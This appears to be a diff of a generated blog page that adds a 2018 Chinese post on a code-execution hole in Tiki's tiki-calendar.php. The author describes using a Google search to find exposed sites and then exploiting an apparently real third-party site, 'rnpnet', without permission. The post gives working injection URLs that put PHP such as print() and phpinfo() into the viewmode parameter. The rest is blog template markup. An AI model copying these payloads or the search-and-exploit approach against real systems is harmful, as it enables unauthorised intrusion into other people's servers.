@@ -79,13 +79,17 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hu3sky">
-<meta property="og:url" content="http://yoursite.com/categories/Arbitrary-File-Upload/index.html">
+<meta name="description" content="0x00emmm。最近跟着彭哥做项目，疯狂的复现一些cve，包括上传漏洞和代码执行漏洞。 0x01因为这个漏洞是发生在calendar.php。由于exp给的源码本地没有复现成功，所以想着去外面看看能不能找到洞。于是 谷歌 inurl:tiki-calendar.php。找到一堆，试了前面几个 不行，于是在尝试到rnpnet的时候，意外的惊喜出现了。 0x02漏洞利用http://yoururl/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rnpnet tiki-calendar.php页面存在代码执行漏洞">
+<meta property="og:url" content="http://yoursite.com/2018/04/01/代码执行/index.html">
 <meta property="og:site_name" content="Hu3sky">
+<meta property="og:description" content="0x00emmm。最近跟着彭哥做项目，疯狂的复现一些cve，包括上传漏洞和代码执行漏洞。 0x01因为这个漏洞是发生在calendar.php。由于exp给的源码本地没有复现成功，所以想着去外面看看能不能找到洞。于是 谷歌 inurl:tiki-calendar.php。找到一堆，试了前面几个 不行，于是在尝试到rnpnet的时候，意外的惊喜出现了。 0x02漏洞利用http://yoururl/">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-04-01T13:06:45.625Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hu3sky">
+<meta name="twitter:title" content="rnpnet tiki-calendar.php页面存在代码执行漏洞">
+<meta name="twitter:description" content="0x00emmm。最近跟着彭哥做项目，疯狂的复现一些cve，包括上传漏洞和代码执行漏洞。 0x01因为这个漏洞是发生在calendar.php。由于exp给的源码本地没有复现成功，所以想着去外面看看能不能找到洞。于是 谷歌 inurl:tiki-calendar.php。找到一堆，试了前面几个 不行，于是在尝试到rnpnet的时候，意外的惊喜出现了。 0x02漏洞利用http://yoururl/">
 
 
 
@@ -115,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/categories/Arbitrary-File-Upload/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/04/01/代码执行/"/>
 
 
 
 
 
-  <title>分类: Arbitrary File Upload | Hu3sky</title>
+  <title>rnpnet tiki-calendar.php页面存在代码执行漏洞 | Hu3sky</title>
   
 
 
@@ -140,7 +144,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
     <a href="https://github.com/Hu3sky/Hu3sky.github.io"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_white_ffffff.png" alt="Fork me on GitHub"></a>
 
@@ -245,55 +249,165 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block category">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>Arbitrary File Upload<small>分类</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/01/代码执行/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hu3sky">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/ctf/头像.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hu3sky">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/03/23/VehicleWorkshop/" itemprop="url">
-              
-                <span itemprop="name">VehicleWorkshop上传漏洞本地复现</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">rnpnet tiki-calendar.php页面存在代码执行漏洞</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-03-23T17:02:29+08:00"
-              content="2018-03-23" >
-          03-23
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-01T00:00:00+08:00">
+                2018-04-01
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码执行/" itemprop="url" rel="index">
+                    <span itemprop="name">代码执行</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>emmm。最近跟着彭哥做项目，疯狂的复现一些cve，包括上传漏洞和代码执行漏洞。</p>
+<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>因为这个漏洞是发生在calendar.php。由于exp给的源码本地没有复现成功，所以想着去外面看看能不能找到洞。于是 谷歌 inurl:tiki-calendar.php。找到一堆，试了前面几个 不行，于是在尝试到rnpnet的时候，意外的惊喜出现了。</p>
+<h1 id="0x02漏洞利用"><a href="#0x02漏洞利用" class="headerlink" title="0x02漏洞利用"></a>0x02漏洞利用</h1><p><a href="http://yoururl/tiki-calendar.php?viewmode=%27;print(%27Hu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BC%27);$a=%27&gt;" target="_blank" rel="noopener">http://yoururl/tiki-calendar.php?viewmode=%27;print(%27Hu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BC%27);$a=%27&gt;</a> ！<a href="/ctf/代码执行1.png">复现</a>emmm。不要在意输出的是什么，略过略过。<br><a href="http://yoururl/tiki-calendar.php?viewmode=%27;phpinfo();$a=%27" target="_blank" rel="noopener">http://yoururl/tiki-calendar.php?viewmode=%27;phpinfo();$a=%27</a> 这样就直接输出了phpinfo<br>！<a href="/ctf/代码执行.png">phpfinfo</a></p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/28/cookie与session/" rel="next" title="cookie与session的笔记">
+                <i class="fa fa-chevron-left"></i> cookie与session的笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -301,6 +415,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -321,8 +439,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -377,6 +504,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00"><span class="nav-number">1.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01"><span class="nav-number">2.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">0x02漏洞利用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -535,6 +678,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
